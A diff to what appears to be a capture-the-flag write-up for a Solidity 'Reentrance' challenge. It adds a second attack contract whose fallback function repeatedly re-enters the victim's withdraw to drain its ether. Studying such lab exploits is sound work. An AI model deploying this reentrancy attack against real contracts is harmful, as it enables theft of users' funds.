@@ -41,6 +41,7 @@ contract AttackReentrancy {
 
     function maliciousWithdraw() public payable {
         // Call withdraw
+        // https://www.reddit.com/r/ethdev/comments/fohqaw/understanding_the_intricacies_of_call/flihiaq/
         bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.5 ether);
         victim.call(payload);
     }
@@ -51,6 +52,36 @@ contract AttackReentrancy {
 
     function withdraw() public {
         msg.sender.transfer(address(this).balance);
+    }
+}
+```
+
+or
+
+```js
+import 'Reentrance.sol';
+contract AttackReentrancy {
+    Reentrance victim;
+    constructor(address payable _victim) public payable {
+        victim = Reentrance(_victim);
+        victim.donate{value: 1 ether}(address(this));
+    }
+
+    function maliciousWithdraw() public payable {
+        victim.withdraw(0.5 ether);
+    }
+
+
+    function getBalance() public view returns (uint balance) {
+        return address(this).balance;
+    }
+
+    function withdraw() public {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    fallback() external payable {
+        maliciousWithdraw();
     }
 }
 ```
